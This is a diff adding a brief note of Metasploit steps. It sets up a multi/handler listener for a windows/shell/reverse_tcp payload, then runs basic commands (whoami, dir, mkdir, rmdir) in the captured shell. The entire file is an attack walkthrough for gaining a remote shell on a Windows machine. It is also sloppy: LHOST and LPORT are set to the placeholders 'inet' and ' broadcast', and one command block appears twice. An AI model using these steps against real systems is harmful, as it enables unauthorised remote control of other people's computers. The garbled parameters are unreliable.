@@ -1,0 +1,24 @@
+1.in terminal
+>ifconfig
+2.in another terminal 
+>msfconsole
+3.type command
+>use exploit/multi/handler
+>set payload windows/shell/reverse_tcp
+>set LHOST "inet"
+>set LPORT " broadcast"
+>exploit
+
+4.open metasploit framework
+>use exploit/multi/handler
+>set payload windows/shell/reverse_tcp
+>set LHOST "inet"
+>set LPORT " broadcast"
+>exploit
+
+>whoami
+>ls
+>dir
+>mkdir "name"
+>ls
+>rmdir "name"
